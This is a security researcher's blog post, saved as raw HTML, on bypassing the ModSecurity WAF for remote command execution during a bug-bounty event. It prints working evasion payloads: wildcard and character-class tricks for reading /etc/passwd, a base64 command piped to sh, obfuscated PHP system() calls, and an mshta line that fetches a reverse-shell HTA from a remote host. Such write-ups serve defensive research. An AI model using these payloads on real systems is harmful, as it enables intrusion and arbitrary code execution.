<!DOCTYPE html> <html lang=" en"> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1"> <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/> <link rel="icon" type="image/x-icon" href="/favicon.ico"> <title>Bypassing ModSecurity for RCEs | Somdev Sangwan</title> <meta name="generator" content="Jekyll v3.10.0"/> <meta property="og:title" content="Bypassing ModSecurity for RCEs"/> <meta name="author" content="Somdev Sangwan"/> <meta property="og:locale" content="en_US"/> <meta name="description" content="A tale of multiple RCE bypasses for ModSecurity WAF."/> <meta property="og:description" content="A tale of multiple RCE bypasses for ModSecurity WAF."/> <link rel="canonical" href="https://somdev.in/blog/modsecurity-rce-bypass"/> <meta property="og:url" content="https://somdev.in/blog/modsecurity-rce-bypass"/> <meta property="og:site_name" content="Somdev Sangwan"/> <meta property="og:image" content="https://somdev.in/assets/thumbs/modsecurity-event.png"/> <meta property="og:type" content="article"/> <meta property="article:published_time" content="2022-08-29T18:32:00+05:30"/> <meta name="twitter:card" content="summary_large_image"/> <meta property="twitter:image" content="https://somdev.in/assets/thumbs/modsecurity-event.png"/> <meta property="twitter:title" content="Bypassing ModSecurity for RCEs"/> <meta name="twitter:site" content="@s0md3v"/> <meta name="twitter:creator" content="@Somdev Sangwan"/> <script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Somdev Sangwan"},"dateModified":"2022-08-29T18:32:00+05:30","datePublished":"2022-08-29T18:32:00+05:30","description":"A tale of multiple RCE bypasses for ModSecurity WAF.","headline":"Bypassing ModSecurity for RCEs","image":"https://somdev.in/assets/thumbs/modsecurity-event.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://somdev.in/blog/modsecurity-rce-bypass"},"url":"https://somdev.in/blog/modsecurity-rce-bypass"}</script> <link rel="preconnect" href="https://fonts.googleapis.com"> <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> <style>:root{--base-font-size:1rem;--blog-font-size:1rem;--base-font-family:"Lexend","Helvetica Neue",Helvetica,Arial,sans-serif;--blog-font-family:var(--base-font-family);--background-color:#fafafa;--foreground-color:#1a1a1a;--midground-color:#666;--accent-color:#1976d2;--link-hover-bg:#e5e5e5;--muted-color:#666;--border-color:#e5e5e5;--code-bg:#f0f0f0;--link-color:#0b5394;--link-visited:#0d47a1;--icon-filter:none}.dark-mode{--background-color:#1e1e1e;--foreground-color:#e0e0e0;--midground-color:#a0a0a0;--accent-color:#42a5f5;--link-hover-bg:#333;--muted-color:#888;--border-color:#333;--code-bg:#2d2d2d;--link-color:#64b5f6;--link-visited:#a6d6ff;--icon-filter:invert(1)}.cream-mode{--background-color:#f3f0e6;--foreground-color:#2d2a26;--midground-color:#5d564f;--accent-color:#1565c0;--link-hover-bg:#e6e2d6;--muted-color:#5d564f;--border-color:#dcd6c6;--code-bg:#e8e2d2;--link-color:#0d47a1;--link-visited:#0d47a1;--icon-filter:none}*{font-feature-settings:"kern" 1,"liga" 1,"onum" 0;margin:0;padding:0;box-sizing:border-box;font-variant-numeric:normal}html{-webkit-hyphens:auto;background:var(--background-color);color:var(--foreground-color);font-size:1rem;height:100%;hyphens:auto;margin:0;padding:0;scroll-behavior:smooth;overflow-y:scroll;text-rendering:optimizeLegibility}body{display:flex;flex-direction:column;height:100%;font:400 16px/1.5 "Helvetica Neue",Helvetica,Arial,sans-serif}a{background:0;color:var(--foreground-color);text-decoration:none}a:hover{background:var(--link-hover-bg)}</style> <script>function getPreferredTheme(){const e=localStorage.getItem("theme");return e&&themes.includes(e)?e:window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"}function applyTheme(e){document.documentElement.classList.remove("light-mode","dark-mode","cream-mode"),document.documentElement.classList.add(`${e}-mode`),localStorage.setItem("theme",e)}const themes=["light","dark","cream"];try{applyTheme(getPreferredTheme())}catch(e){console.error("Theme initialization failed:",e)}try{window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",e=>{localStorage.getItem("theme")||applyTheme(e.matches?"dark":"light")})}catch(e){}</script> <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@100..900&display=swap" rel="stylesheet"> <link rel="stylesheet" href="/assets/css/fonts.css"> <link rel="stylesheet" href="/assets/css/common.css"> <script src="/assets/js/common.js" defer></script> <script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Person",
  "name": "Somdev Sangwan",
  "url": "https://somdev.in",
  "image": "https://somdev.in/assets/images/profile.jpg",
  "jobTitle": "Security Researcher & Developer",
  "alternateName": "s0md3v",
  "description": "Somdev Sangwan is a security researcher & developer. He also writes about epistemology and ethics.",
  "knowsAbout": [
    "Computer Security",
    "Programming"
  ],
  "sameAs": [
    "https://twitter.com/s0md3v",
    "https://github.com/s0md3v",
    "https://linkedin.com/in/s0md3v",
    "https://instagram.com/s0md3v",
    "https://linuxsecurity.expert/p/somdev-sangwan"
  ],
  "subjectOf": [
    {
      "@type": "CreativeWork",
      "name": "BleepingComputer: Hacker says hijacking libraries, stealing AWS keys was ethical research",
      "url": "https://www.bleepingcomputer.com/news/security/hacker-says-hijacking-libraries-stealing-aws-keys-was-ethical-research/"
    },
    {
      "@type": "CreativeWork",
      "name": "The Hacker News: PyPi Package 'ctx' and PHP Library 'phpass' Compromised",
      "url": "https://thehackernews.com/2022/05/pypi-package-ctx-and-php-library-phpass.html"
    },
    {
      "@type": "CreativeWork",
      "name": "India Today: Hacker Claims He Can Crack Aadhaar Password in 3 Seconds",
      "url": "https://www.indiatoday.in/technology/news/story/hacker-claims-he-can-crack-aadhaar-password-in-3-seconds-1306400-2018-08-06"
    },
    {
      "@type": "CreativeWork",
      "name": "Deccan Herald: I've seen all your data without hacking",
      "url": "https://www.deccanherald.com/opinion/i-ve-seen-all-your-data-without-hacking-812289.html"
    }
  ]
}
</script> </head> <body> <a href="#main-content" class="skip-link">Skip to main content</a> <header id="site-header" class="header"> <nav class="nav-container"> <div class="site-home"> <a href="/">home</a> <div class="settings-wrapper"> <button class="settings-icon" id="settings-toggle" aria-label="Settings"> <img src="/assets/icons/settings.svg" alt="Settings" width="20" height="20"> </button> <div class="settings-dropdown" id="settings-menu"> <div class="settings-section"> <div class="settings-subtitle">Theme</div> <div class="settings-options theme-options"> <button data-theme="light">Light</button> <button data-theme="dark">Dark</button> <button data-theme="cream">Cream</button> </div> </div> <div class="settings-section"> <div class="settings-subtitle">Font</div> <div class="settings-options font-options"> <button data-font="system">System</button> <button data-font="lexend">Lexend</button> <button data-font="opendyslexic">Dyslexic</button> </div> </div> <div class="settings-section"> <div class="settings-subtitle">Font Size</div> <div class="settings-options size-options"> <button id="decrease-font">−</button> <button id="reset-font">Reset</button> <button id="increase-font">+</button> </div> </div> </div> </div> </div> <button class="menu-toggle" aria-label="Toggle navigation"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"> <path d="M3 12H21" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/> <path d="M3 6H21" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/> <path d="M3 18H21" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/> </svg> </button> <ul class="nav-links"> <li><a href="/projects">projects</a></li> <li><a href="/blog">blog</a></li> <li><a href="/philosophy">philosophy</a></li> <li><a href="/about">about</a></li> </ul> </nav> </header> <div class="blog-content"> <div class="wrapper"> <h1 class="post-title" itemprop="name headline">Bypassing ModSecurity for RCEs</h1> <p class="post-meta"> </p> <div class="post-content"> <blockquote> <p>tl;dr: I bypassed <a href="https://github.com/SpiderLabs/ModSecurity">ModSecurity</a> for multiple RCEs in a hacking event hosted by <a href="https://www.intigriti.com/">intigriti</a>.</p> </blockquote> <h2 id="wafs-101">WAFs 101</h2> <p>Firewalls stop attacks. They can recognize them with their database of various rules that describe what an attack looks like. These rules are created by hand or automated analysis of thousands of actual attacks.</p> <p>A web application firewall is a firewall, for websites.</p> <h3 id="blacklists-are-hard">Blacklists are hard</h3> <p><code class="language-plaintext highlighter-rouge">ping</code> is a tool commonly used to troubleshoot networks. As a WAF programmer, you might want to block attempts to run it. But what if user A sends a text message to user B through your WAF,</p> <blockquote> <p>your router looks fine, try to ping google.com</p> </blockquote> <p>That’s it. The WAF blocked the message, the user filed a complaint to the website owner. The owner debugged the issue and found out that the WAF was at fault.<br/> Now prepare for an angry twitter thread to be shoved down your throat, your wife Karen leaving you and taking the kids with her. You are done.</p> <p>Jokes apart and credit where it’s due, writing anti-attack rules for unknown contexts is tough. You need to prioritize false negatives over false positives over multiple levels of security while still protecting against the most common attacks.</p> <p>With that being said, let me tell you a tale of why I am so cool and such a genius for trying random things until some of them worked.</p> <h2 id="filenames-in-linux">Filenames in Linux</h2> <blockquote> <p>Note: When I say “linux”, it means *nix (linux and unix). This applies to the entire article.</p> </blockquote> <p>It is common knowledge that in linux, wildcards such as <code class="language-plaintext highlighter-rouge">*</code> and <code class="language-plaintext highlighter-rouge">?</code> are allowed in filenames. But did you know that character classes are also allowed? If your file is named <code class="language-plaintext highlighter-rouge">test.txt</code>, you can access it by typing <code class="language-plaintext highlighter-rouge">te[sn]t.txt</code>. The <code class="language-plaintext highlighter-rouge">[sn]</code> here is a <em>character class</em> which says that the character in this place can be an <code class="language-plaintext highlighter-rouge">s</code> or an <code class="language-plaintext highlighter-rouge">n</code> i.e. it will match both <code class="language-plaintext highlighter-rouge">test.txt</code> and <code class="language-plaintext highlighter-rouge">tent.txt</code>.</p> <p>If you add an exclamation symbol (<code class="language-plaintext highlighter-rouge">!</code>) at the beginning of the character class (i.e. <code class="language-plaintext highlighter-rouge">[!sn]</code>) it will match everything other than the characters in it (i.e. <code class="language-plaintext highlighter-rouge">s</code> and <code class="language-plaintext highlighter-rouge">n</code>).</p> <p>These character classes notations were not getting detected by ModSecurity, giving us two neat bypasses:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/pass[w]d
cat /etc/pass[!x]d
</code></pre></div></div> <h2 id="everything-is-a-file-in-unix">Everything is a file in Unix</h2> <blockquote> <p>“Everything is a file” describes one of the defining features of Unix, and its derivatives—that a wide range of input/output resources such as documents, directories, hard-drives, modems, keyboards, printers and even some inter-process and network communications are simple streams of bytes exposed through the filesystem name space.</p> <ul> <li><a href="https://en.wikipedia.org/wiki/Everything_is_a_file">WikiPedia</a></li> </ul> </blockquote> <p>Every command in linux is ultimately an executable binary file stored in <code class="language-plaintext highlighter-rouge">/usr/bin</code>. Thus instead of executing <code class="language-plaintext highlighter-rouge">ping</code>, you can write <code class="language-plaintext highlighter-rouge">/usr/bin/ping</code> and it will work.</p> <p>Building on my previous exploit that could only interact with files, I turned that file-access technique into a juicy RCE with</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/who[a]mi
</code></pre></div></div> <h2 id="utilising-the-linux-utilities">Utilising the linux utilities</h2> <p>There are some amazing <a href="https://en.wikipedia.org/wiki/List_of_GNU_Core_Utilities_commands">core utilities</a> that come pre-installed in linux.</p> <p>I cross-checked them with ModSecurity’s rules and found some commands that were missing from the blacklist. With a bit of reading here and there, the <code class="language-plaintext highlighter-rouge">base64</code> utility caught my eye. As the name suggests, it does <a href="https://en.wikipedia.org/wiki/Base64">base64</a> encoding/decoding.</p> <p>The idea was to encode the command as base64, decode it and pass the result to something that can “eval” it as a command.</p> <p>There were some problems with this plan,</p> <ol> <li>base64 utility needed <a href="https://linuxhint.com/bash_stdin_stderr_stdout/">stdin</a> and the only plausible way to do that was with <code class="language-plaintext highlighter-rouge">echo</code> (e.g. <code class="language-plaintext highlighter-rouge">echo dW5hbWUgLWE= | base64 -d</code>). But <code class="language-plaintext highlighter-rouge">echo</code> was blacklisted, as it should be.</li> <li><code class="language-plaintext highlighter-rouge">sh</code> (shell) command can execute stdin as a command. Unfortunately, it was blacklisted too and there is no alternative to <code class="language-plaintext highlighter-rouge">sh</code>.</li> </ol> <p>I solved the first problem by using <code class="language-plaintext highlighter-rouge">printf</code> instead of <code class="language-plaintext highlighter-rouge">echo</code>. It’s an echo-like utility that supports string formatting.</p> <p>The second one seemed like a dead end, the most common outcome in research. I did what researchers do, I decided to pursue other ideas as a break. It helped, after some messing around I found that if a command isn’t followed by any character, it doesn’t get detected.</p> <p>Combining these two bypasses, the final bypass becomes this:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>printf dW5hbWUgLWE= | base64 -d | sh
</code></pre></div></div> <p>Here, we base64 encoded a command, used the <code class="language-plaintext highlighter-rouge">base64</code> to decode it and then used <code class="language-plaintext highlighter-rouge">sh</code> to execute the decoded command.</p> <p>The neat thing about this bypass is that you smuggle literally anything and since it’s base64 encoded, the WAF won’t detect a thing.</p> <h2 id="windows-is-no-different">Windows is no different</h2> <p>Hacking is about trying things. Sometimes stupidly obvious, sometimes things you learned from a 4-page forum thread from 2006 and sometimes whatever keys you can press with your blurry sleepy eyes at 4 AM.</p> <p>I tried the <code class="language-plaintext highlighter-rouge">?</code> filepath wildcard on Windows and it worked. ModSecurity didn’t detect it since the wildcard detection rules were for <code class="language-plaintext highlighter-rouge">/paths/like/this</code> not <code class="language-plaintext highlighter-rouge">C:\paths\like\this</code>. Easy.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\System32\WindowsPowerShell\v1.0\power?hell.exe -File test.ps1
</code></pre></div></div> <h3 id="programming-languages-have-versions-now">Programming languages have versions now?</h3> <p>ModSecurity blocked <code class="language-plaintext highlighter-rouge">python xyz</code>, <code class="language-plaintext highlighter-rouge">python2 xyz</code> and <code class="language-plaintext highlighter-rouge">python3 xyz</code>. “Unfortunately”, you can also invoke specific versions of the interpreter as <code class="language-plaintext highlighter-rouge">python3.10 xyz</code> for example. This variation wasn’t blacklisted and hence I found a way to install arbitrary malware using python.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3.10 -m pip install malware
</code></pre></div></div> <h2 id="entering-through-the-windows">Entering through the Windows</h2> <p>Windows is a gold mine for not-so-well-known features. Some found through a blog of a 16yo reverse engineer, some through Windows 95 guides and some by simply googling “windows malware delivery github”.</p> <p>I found a utility named <a href="https://redcanary.com/threat-detection-report/techniques/mshta/">mshta</a> which is a windows component that deals with HTA (<a href="https://en.wikipedia.org/wiki/HTML_Application">HTML Application</a>) files. These files can contain executable VBScript code and there’s even a metasploit module to generate malicious HTA files.</p> <p>ModSecurity didn’t detect it which gave me a payload that can download+execute arbitrary VBScript code.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mshta http://example.com/reverseShell.hta
</code></pre></div></div> <h2 id="php-injection">PHP Injection</h2> <p>You should check out <a href="https://github.com/coreruleset/coreruleset">OWASP Core Rule Set</a>, the collection of WAF rules used by ModSecurity. The comprehensibly documented rules through comments make it an excellent resource.</p> <p>While trying to get my PHP function calls through the WAF, I went through the documentation of the <a href="https://github.com/coreruleset/coreruleset/blob/977ccdfb914e6d62b00ae26e2006b75b22e3df6c/rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf#L418">rule</a> that detects them. It was there where I learned that an attacker can obfuscate a function call as:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$x='sy'.'tem';
$x(ls);
</code></pre></div></div> <p>Something clicked immediately, what if I could do this segmentation without a variable? One thing led to another and after a bit of testing, I came up with:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>return"system"(ls).s;
</code></pre></div></div> <p>Don’t ask me to explain how this one works, I don’t know much about PHP. I just tried things that made sense after looking at known bypasses and this one worked in a PHP webpage I created for testing.</p> <h3 id="credits">Credits</h3> <p>ModSecurity with the OWASP Core Rule Set on top is an open-source WAF and if you ask me, it’s as good as WAFs get. It is almost impossible to bypass it for XSS, the rules are that good.</p> <p>Shoutouts to them for maintaining such an important and free project responsibly and thanks to intigriti for hosting this hacking event and inviting me.</p> <p>That’s all folks.</p> </div> </div> </div> </body> </html>